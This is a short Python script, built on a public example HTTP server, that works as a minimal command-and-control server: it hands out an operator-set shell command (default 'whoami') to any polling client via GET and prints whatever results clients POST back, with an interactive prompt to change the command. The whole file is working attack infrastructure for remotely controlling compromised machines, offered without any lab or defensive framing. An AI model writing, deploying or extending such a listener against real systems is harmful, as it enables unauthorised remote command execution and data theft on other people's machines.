#!/usr/bin/env python3
#  https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

import threading

command = b"whoami"

class S(BaseHTTPRequestHandler):
    def _set_response(self, status_code=200, content_type='text/html'):
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def do_GET(self):
        self._set_response(content_type="text/plain")
        self.wfile.write(command)

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        print(post_data.decode('utf-8'))

        self._set_response()

    def log_request(self, code='-', size='-'):
        self.log_message('"%s"', self.requestline)


def run(server_class=HTTPServer, handler_class=S, port=80):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

def interactive_shell():
    print("Interactive shell started. Type 'exit' to quit.")
    global command
    while True:
        user_input = input("Enter new command: ")
        if user_input == 'exit':
            print("Exiting interactive shell.")
            break
        elif user_input:
            command = user_input.encode()
            print(f"Command updated to: {command}")

if __name__ == '__main__':
    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=run, daemon=True)
    server_thread.start()

    # Start the interactive shell on the main thread
    interactive_shell()


